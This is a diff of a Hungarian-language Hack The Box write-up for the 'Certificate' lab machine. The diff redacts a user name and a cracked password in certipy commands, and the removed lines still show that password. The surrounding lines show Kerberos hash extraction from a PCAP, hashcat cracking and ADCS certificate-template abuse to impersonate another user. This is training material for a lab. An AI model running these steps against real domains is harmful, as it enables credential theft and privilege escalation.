@@ -225,7 +225,7 @@ evil-winrm -i 10.10.11.71 -u Sara.B -p 'Bl******'
 ## PCAP elemzés – Kerberos hash
 
 - `WS-01_PktMon.pcap` (Kerberos forgalom)
-- A PCAP fájlban egy TGS-REQ látható, ahol Lion.SK kért ticketet. Ez használható Kerberoastinghoz, ha a szolgáltatás SPN-nel van regisztrálva. A Krb5RoastParser direkt AS-REQ vagy TGS-REQ hash-t szed ki.
+- A PCAP fájlban egy TGS-REQ látható. Ez használható Kerberoastinghoz, ha a szolgáltatás SPN-nel van regisztrálva. A Krb5RoastParser direkt AS-REQ vagy TGS-REQ hash-t szed ki.
 - `Krb5RoastParser` használat:
 >  https://github.com/jalvarezz13/Krb5RoastParser
 
@@ -249,7 +249,7 @@ hashcat -m 19900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 ### Lion.SK
 
 ```bash
-certipy req -u 'lion.sk@CERTIFICATE.HTB' -p "\!QAZ2wsx" -dc-ip '10.10.11.71' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'
+certipy req -u 'lion.sk@CERTIFICATE.HTB' -p "\!QA<pass>" -dc-ip '10.10.11.71' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
@@ -263,7 +263,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 ### Ryan.K
 
 ```bash
-certipy req -u 'lion.sk@CERTIFICATE.HTB' -p "\!QAZ2wsx" -dc-ip '10.10.11.71' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'SignedUser' -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\ryan.k'
+certipy req -u 'lion.sk@CERTIFICATE.HTB' -p "\!QA<pass>" -dc-ip '10.10.11.71' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'SignedUser' -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\ryan.k'
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
